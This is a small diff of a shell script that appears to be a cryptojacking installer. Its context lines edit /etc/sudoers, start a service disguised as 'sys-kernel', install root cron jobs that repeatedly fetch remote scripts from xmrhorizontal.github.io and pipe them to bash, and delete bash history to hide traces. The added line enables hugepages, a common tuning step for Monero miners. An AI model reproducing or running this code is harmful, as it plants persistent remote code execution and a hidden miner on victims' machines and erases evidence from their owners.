@@ -23,6 +23,7 @@ sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
     systemctl start sys-kernel.service
     echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
     echo "*/58 * * * * root curl -s https://xmrhorizontal.github.io/searcher.sh | bash" > /etc/cron.d/cronextend
+    sysctl -w vm.nr_hugepages=128
     rm -f ~/.bash_history
     rm -f /root/.bash_history
 echo OK!
